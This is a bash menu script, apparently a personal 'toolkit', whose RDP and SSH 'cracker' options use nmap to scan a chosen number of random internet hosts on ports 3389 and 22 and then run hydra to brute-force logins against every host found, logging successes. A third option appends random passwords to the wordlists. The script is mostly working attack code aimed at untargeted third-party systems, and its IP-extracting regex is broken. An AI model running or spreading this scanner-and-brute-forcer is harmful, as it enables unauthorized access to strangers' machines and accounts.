#!/usr/bin/env bash

clear

tool_one() {
    clear
    echo "=== rdp(windows) cracker ==="

    read -p "How many random targets: " nmap_input
    read -p "hydra scaning: " hydra_scan

    echo
    echo "=== Nmap ==="
    nmap -iR "$nmap_input" -sT -p 3389 -o rdp/iplist.txt
    echo
    echo "=== grep ==="
    grep -oE '([0-9]{1,3}/.){3}[1-9]{1,3}' rdp/iplist.txt > rdp/iplog.txt

    echo
    echo "=== hydra ==="
    hydra -M rdp/iplog.txt -L userlist.txt -P rdp/pass.txt -t "$hydra_scan" -T -o rdp/finish.txt rdp
}

tool_two() {
    clear
    echo "=== rdp(windows) cracker ==="

    read -p "How many random targets: " nmap_input
    read -p "Hydra input: " hydra_input

    echo
    echo "=== Nmap ==="
    nmap -iR "$nmap_input" -sT -p 22 -o ssh/iplist.txt
    echo
    echo "=== grep ==="
    grep -oE '([0-9]{1,3}/.){3}[1-9]{1,3}' ssh/iplist.txt > ssh/iplog.txt

    echo
    echo "=== hydra ==="
    hydra -M ssh/iplog.txt -L userlist.txt -P ssh/pass.txt -t "$hydra_input" -T -o ssh/finish.txt ssh
}

password_generator() {
    clear
    echo "=== Password Generator ==="

    read -p "Password length: " length

    password=$(tr -dc 'A-Za-z0-9!@#$%^&*' < /dev/urandom | head -c "$length")

    echo "$password" >> "ssh/pass.txt"
    echo "$password" >> "rdp/pass.txt"

    echo
    echo "Generated password: $password"
}

while true; do
    clear
    echo "===================="
    echo "    My Toolkit"
    echo "===================="
    echo "1) rdp(windows) cracker"
    echo "2) ssh(linux) cracker"
    echo "4) Password Generator"
    echo "0) Exit"
    echo "===================="

    read -p "Select: " choice

    case $choice in
        1)
            tool_one
            ;;
        2)
            tool_two
            ;;
        4)
            password_generator
            ;;
        0)
            exit 0
            ;;
        *)
            echo "Invalid option"
            sleep 1
            ;;
    esac

    read -p "Press Enter to return..."
done